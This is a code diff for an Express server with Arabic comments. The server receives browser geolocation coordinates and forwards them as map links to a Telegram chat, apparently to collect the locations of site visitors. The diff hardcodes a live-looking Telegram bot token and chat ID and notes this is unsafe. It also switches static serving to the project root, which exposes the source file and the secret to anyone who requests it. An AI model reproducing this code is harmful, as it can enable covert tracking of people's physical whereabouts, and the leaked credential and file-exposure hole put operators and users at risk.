@@ -6,25 +6,37 @@ const app = express();
 app.use(express.json());
 
 const PORT = process.env.PORT || 3000;
-const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN; // خزّن التوكن في متغير بيئة
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID; // نفس الشي للـ chat_id
 
-// تقديم الملفات الثابتة (HTML, CSS, JS) من مجلد public
-app.use(express.static(path.join(__dirname, "index.html")));
+// 🔴 إدخال مباشر (غير آمن لو الكود عام)
+const TELEGRAM_TOKEN = "7867382864:AAHeEvpiotKr4BQMAY_YbrCVl-rloJI-MqQ";
+const TELEGRAM_CHAT_ID = "6837315281";
+
+// تقديم الملفات الثابتة
+app.use(express.static(__dirname));
 
 // استقبال الموقع من المتصفح وإرساله إلى تيليجرام
 app.post("/send-location", async (req, res) => {
   const { lat, lng, accuracy } = req.body;
-  if (!lat || !lng) return res.status(400).json({ error: "Missing coordinates" });
+  if (!lat || !lng) {
+    return res.status(400).json({ error: "Missing coordinates" });
+  }
 
-  const text = `📍 موقع جديد:\nhttps://maps.google.com/?q=${lat},${lng}\nخط العرض: ${lat}\nخط الطول: ${lng}\nالدقة: ${accuracy || "?"}m`;
+  const text = `📍 موقع جديد:
+https://maps.google.com/?q=${lat},${lng}
+خط العرض: ${lat}
+خط الطول: ${lng}
+الدقة: ${accuracy || "?"}m`;
 
   try {
     await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text }),
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text
+      }),
     });
+
     res.json({ ok: true });
   } catch (err) {
     console.error("فشل الإرسال إلى تيليجرام:", err.message);
@@ -32,7 +44,7 @@ app.post("/send-location", async (req, res) => {
   }
 });
 
-// صفحة رئيسية (تقديم index.html)
+// الصفحة الرئيسية
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "index.html"));
 });
